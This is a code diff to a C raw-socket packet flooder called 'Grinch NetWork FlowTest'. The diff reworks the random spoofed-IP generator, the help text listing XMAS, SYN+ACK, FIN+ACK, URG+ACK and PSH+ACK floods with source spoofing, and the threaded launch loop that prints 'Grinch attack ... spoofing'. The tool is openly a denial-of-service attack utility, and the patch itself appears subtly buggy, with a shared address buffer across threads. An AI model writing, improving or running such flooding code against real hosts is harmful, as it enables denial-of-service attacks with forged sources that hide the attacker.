@@ -55,15 +55,17 @@ coded by
   "ex: ./code www.server.com 80 20000 4 5",
   "..::Grinch:NetWork:FlowTest::..",
 
- Need RooT to COmpile THis z use raw sock
-  gcc -o hyde3 hyde3.c -lpthread; ./hyde3
+ Need RooT to COmpile THis
+  gcc -o hyde3 hyde3.c;
 
 Author: Cooler_
 E-mail: c00f3r[at]gmail[dot]com
 date: 17/03/2010
 BugSec Security TEAM
 http://code.google.com/p/bugsec/
-thanks: m0nad,_mlk_,IAK,sigsegv,b4r0n,MenteBinaria,f117,delfo,c0lt7r,joey,fokerbug,zepplin,otacon,backbone,nibbles,voidpointer,muzgo...
+thanks: m0nad,_mlk_,IAK,sigsegv,b4r0n,MenteBinaria,
+f117,delfo,c0lt7r,joey,fokerbug,zepplin,otacon,backbone,
+nibbles,voidpointer,muzgo,nbrito .
  
 */
 #include <stdio.h>    
@@ -111,20 +113,9 @@ void *xmalloc(unsigned int len)
  return ptr;
 }
 
-char *RandomIp(void)
-{     
- char *ipRand=NULL;
- int r1,r2,r3,r4;
-
- r1 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));          
- r2 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));          
- r3 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));          
- r4 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));          
-
- ipRand=xmalloc(12*sizeof(char *));
- sprintf(ipRand,"%d.%d.%d.%d",r1,r2,r3,r4); 
-
- return ipRand; 
+in_addr_t RandomIp() 
+{
+ return rand()%0xffffffff + 0x1;
 }
      
 //calculo feito afim de checar a integridade 
@@ -400,20 +391,20 @@ void *fazerpacote(void *arg)
 void help()
 {
  puts(
-  "follow this:"
-  "./code HOST PORT Number_Packets TYPE Threads"
-  " 0 - XMAS with Spoofing"
-  " 1 - SYN+ACK with Spoofing"
-  " 2 - SYN+ACK with Mirror Spoofing"
-  " 3 - FIN+ACK with Spoofing"
-  " 4 - FIN+ACK with Mirror Spoofing"
-  " 5 - URG+ACK with Spoofing"
-  " 6 - URG+ACK With Mirror Spoofing"
-  " 7 - PSH+ACK With Spoofing"
-  " 8 - XMAS with Mirror Spoofing"
-  "ex: ./code www.server.com 80 20000 4 50"
-  "..::Grinch:NetWork:FlowTest::.. "
-  "Coded by Cooler_ c00f3r[at]gmail[dot]com"
+  "follow this:\n"
+  "./code HOST PORT Number_Packets TYPE Threads\n"
+  " 0 - XMAS with Spoofing\n"
+  " 1 - SYN+ACK with Spoofing\n"
+  " 2 - SYN+ACK with Mirror Spoofing\n"
+  " 3 - FIN+ACK with Spoofing\n"
+  " 4 - FIN+ACK with Mirror Spoofing\n"
+  " 5 - URG+ACK with Spoofing\n"
+  " 6 - URG+ACK With Mirror Spoofing\n"
+  " 7 - PSH+ACK With Spoofing\n"
+  " 8 - XMAS with Mirror Spoofing\n"
+  "ex: ./code www.server.com 80 20000 4 50\n"
+  "..::Grinch:NetWork:FlowTest::.. \n"
+  "Coded by Cooler_ c00f3r[at]gmail[dot]com\n"
  );
 }
 
@@ -421,7 +412,11 @@ void help()
 int main(int argc, char *argv[]) 
 {
  char IP[15];
- char *remetente=NULL,*destino=NULL;
+ char *destino=NULL;
+ in_addr_t remetente;
+ void * addr_ptr = NULL;
+ addr_ptr = &remetente;
+ char addr_str[256];
 
  unsigned short port=80;     
  int escolha=0,filhos=0,count=0;
@@ -556,9 +551,10 @@ int main(int argc, char *argv[])
     { 
 // packing arguments 2 function
      remetente=RandomIp();
-     ThreadArgv[0]=remetente;
+     inet_ntop (AF_INET, addr_ptr, addr_str, 256);
+     ThreadArgv[0]=addr_str;
      ThreadArgv[1]=destino;
-     fprintf(stdout,"Grinch attack %s in port %u, spoofing %s in port %u\n", destino, port, remetente, port);   
+     fprintf(stdout,"Grinch attack %s in port %u, spoofing %s in port %u\n", destino, port, addr_str, port);   
 // start thread
       if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
        DEBUG("error in thread %d",count);
@@ -582,7 +578,7 @@ int main(int argc, char *argv[])
  free(ThreadArgv);
  free(StrPort);
  free(StrChoice);
- free(remetente);
+// free(remetente);
 
  return 0;
 }    
